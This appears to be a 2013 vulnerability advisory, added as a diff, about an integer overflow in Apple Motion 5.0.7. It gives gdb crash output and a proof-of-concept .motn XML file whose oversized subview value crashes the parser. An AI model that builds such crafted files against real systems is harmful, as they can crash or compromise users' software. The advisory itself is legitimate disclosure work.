@@ -1,0 +1,51 @@
+Apple Motion Integer Overflow Vulnerability
+===========================================
+
+Vendor: Apple (http://www.apple.com)
+Software: Motion 5.0.7
+Testcase verified on: OS X 10.8
+
+Credit: Jean Pascal Pereira <pereira@secbiz.de>
+
+DESCRIPTION
+===========
+
+An integer overflow vulnerability has been identified in Apple Motion. The issue has been verified for Motion 5.0.7 (current release). Prior versions may also be affected. 
+
+An attacker has the possibility to provide a crafted .motn file containing a viewer element with a subview attribute. If the subview attribute is set to a very low or high integer value, the application crashes due an access violation.
+
+Debug message:
+
+Program received signal EXC_BAD_ACCESS, Could not access memory.
+Reason: KERN_INVALID_ADDRESS at address: 0x00000002dd6e0990
+0x0000000100858eb7 in OZDocument::parseElement ()
+
+The crash is triggered in the function OZDocument::parseElement() at the following instruction:
+
+(gdb) x/i 0x0000000100858eb7 
+0x100858eb7 <_ZN10OZDocument12parseElementER22PCSerializerReadStreamR15PCStreamElement+695>:  mov rsi, QWORD PTR [rbx+rax*8+0x98]
+
+The value of rax is controlled by the attacker (in this case, the rax register contains the integer 989894991 which is provided in the PoC below). 
+
+(gdb) p $rax
+$16 = 989894991
+
+(gdb) p/x $rbx+($rax*8)+0x98
+$1 = 0x2dd6e0990
+
+PROOF OF CONCEPT
+================
+
+Create a .motn file with the following content:
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE ozxmlscene>
+<ozml version="5.5">
+<viewer subview="989894991">
+</viewer>
+</ozml>
+
+DISCLOSURE TIMELINE
+===================
+2013/09/18: Vendor notified
+2013/10/07: Public disclosure
